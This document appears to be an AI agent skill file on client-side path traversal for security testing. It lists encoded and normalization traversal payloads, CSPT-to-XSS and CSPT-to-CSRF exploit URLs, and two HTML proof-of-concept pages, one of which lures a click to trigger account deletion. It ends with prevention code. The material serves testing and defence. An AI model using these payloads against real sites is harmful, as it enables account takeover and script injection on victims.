---
name: client-path-traversal
description: Client-side path traversal techniques for browser-based file access. Use for client-side security testing.
---

# Client-Side Path Traversal (CSPT)

## Description
Client-Side Path Traversal (CSPT) is a vulnerability where attackers inject path traversal sequences (`../`) into client-side requests (typically `fetch` or `XMLHttpRequest`) to redirect requests to unintended endpoints. Since the browser initiates these requests, authentication cookies are automatically included.

## How It Works

1. Application uses user input in URL construction
2. Attacker injects `../` sequences
3. Browser normalizes the path, redirecting request
4. Authentication cookies are automatically sent
5. Attacker controls destination endpoint

## Vulnerability Patterns

### Vulnerable Code Example
```javascript
// User input not properly validated
const newsId = new URLSearchParams(window.location.search).get('id');
fetch(`/api/news/${newsId}`)
    .then(response => response.json())
    .then(data => displayNews(data));

// Exploitation
// URL: /page?id=../admin/users
// Results in: fetch('/api/admin/users')
```

## Attack Vectors

### 1. CSPT to XSS

When you can redirect to an endpoint that returns attacker-controlled content:

**Vulnerable Pattern:**
```javascript
fetch(`/api/templates/${templateId}`)
    .then(r => r.text())
    .then(html => document.body.innerHTML = html);
```

**Exploitation:**
```
URL: /page?templateId=../user-content/malicious
```

**Payload Example:**
```
https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//
```

**Conditions for CSPT to XSS:**
- Unencoded user input in URL path
- Ability to inject path traversal sequences
- Target endpoint returns injectable content
- Content is rendered/executed by client

### 2. CSPT to CSRF

**Advantages over traditional CSRF:**
- Works with POST requests
- Can bypass anti-CSRF tokens (using existing tokens)
- Compatible with SameSite=Lax cookies
- Enables 1-click attacks
- Supports various HTTP methods (GET/POST/PATCH/PUT/DELETE)

**Vulnerable Pattern:**
```javascript
// Normal functionality
fetch('/api/profile/update', {
    method: 'POST',
    body: JSON.stringify(formData),
    credentials: 'include'
});
```

**Exploitation:**
```javascript
// Attacker crafts URL that redirects to sensitive action
// URL: /page?action=../../../admin/delete-user&userId=victim
```

### 3. CSPT to API Abuse

**Redirect to internal endpoints:**
```
Original: /api/public/info/news123
Exploit:  /api/public/info/../admin/secrets
Resolved: /api/admin/secrets
```

## Exploitation Techniques

### Basic Path Traversal
```
# Single traversal
id=../admin

# Multiple traversals
id=../../../sensitive

# With query parameters
id=../admin?user=victim

# With fragments
id=../admin#section
```

### Encoded Traversal
```
# URL encoded
id=%2e%2e%2fadmin

# Double encoded
id=%252e%252e%252fadmin

# Unicode
id=..%c0%afadmin
id=..%c1%9cadmin
```

### Null Byte Injection
```
id=../admin%00.json
id=../admin\x00.json
```

### Path Normalization Tricks
```
# Dot variations
id=.../admin
id=....//admin

# Mixed slashes
id=..\admin
id=../\admin

# With dots
id=..;/admin
id=..%00/admin
```

## Real-World CVE Examples

### Rocket.Chat CSPT2CSRF
```
Vulnerability: CSPT allowing 1-click account takeover
Impact: Full account compromise via CSRF
```

### Mattermost (CVE-2023-45316)
```
Vulnerability: Client-side path traversal in file preview
Impact: Unauthorized access to files
```

### Grafana (CVE-2023-5123)
```
Vulnerability: CSPT in dashboard loading
Impact: Information disclosure, potential XSS
```

## Testing Methodology

### 1. Identify Injection Points
```javascript
// Look for patterns like:
fetch(`/api/${userInput}`)
fetch('/api/' + userInput)
fetch(baseUrl + userInput)
new Request('/api/' + param)
XMLHttpRequest.open('GET', '/api/' + input)
```

### 2. Test Basic Traversal
```
?param=../test
?param=../../test
?param=../../../test
```

### 3. Monitor Network Requests
Use browser DevTools Network tab to see actual requests being made.

### 4. Test Different Encodings
```
?param=%2e%2e%2ftest
?param=..%2ftest
?param=%2e%2e/test
```

## Burp Suite Extension

### CSPTBurpExtension
```bash
# Installation
# 1. Download from: https://github.com/doyensec/CSPTBurpExtension
# 2. Load in Burp: Extensions > Add > Select JAR file
# 3. Configure scanning options
```

### Usage
```
1. Add target to scope
2. Enable passive scanning
3. Browse application normally
4. Review findings for CSPT vulnerabilities
```

## Proof of Concept Template

### CSPT2CSRF PoC
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSPT PoC</title>
</head>
<body>
    <h1>Click the button</h1>
    <button onclick="exploit()">Win Prize!</button>

    <script>
    function exploit() {
        // Redirect user to vulnerable page with CSPT payload
        window.location = 'https://target.com/page?param=' +
            encodeURIComponent('../../../admin/delete-account');
    }
    </script>
</body>
</html>
```

### CSPT2XSS PoC
```html
<!DOCTYPE html>
<html>
<body>
    <script>
    // Craft URL with CSPT to XSS endpoint
    const payload = '../user-content/' + btoa('<script>alert(1)</script>');
    window.location = `https://target.com/view?template=${payload}`;
    </script>
</body>
</html>
```

## Prevention

### Input Validation
```javascript
// Validate input doesn't contain traversal sequences
function sanitizePath(input) {
    // Remove path traversal sequences
    return input.replace(/\.\.\//g, '').replace(/\.\./g, '');
}

// Better: whitelist allowed characters
function validateInput(input) {
    const allowed = /^[a-zA-Z0-9_-]+$/;
    if (!allowed.test(input)) {
        throw new Error('Invalid input');
    }
    return input;
}
```

### URL Construction
```javascript
// Use URL API for safe construction
const url = new URL('/api/resource', window.location.origin);
url.pathname = `/api/resource/${encodeURIComponent(userInput)}`;
fetch(url);
```

### Server-Side Validation
```
- Validate final resolved path
- Check path doesn't escape intended directory
- Implement allowlist for accessible resources
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Path%20Traversal
- https://www.doyensec.com/resources/Doyensec_CSPT_WhitePaper.pdf
- https://github.com/doyensec/CSPTBurpExtension
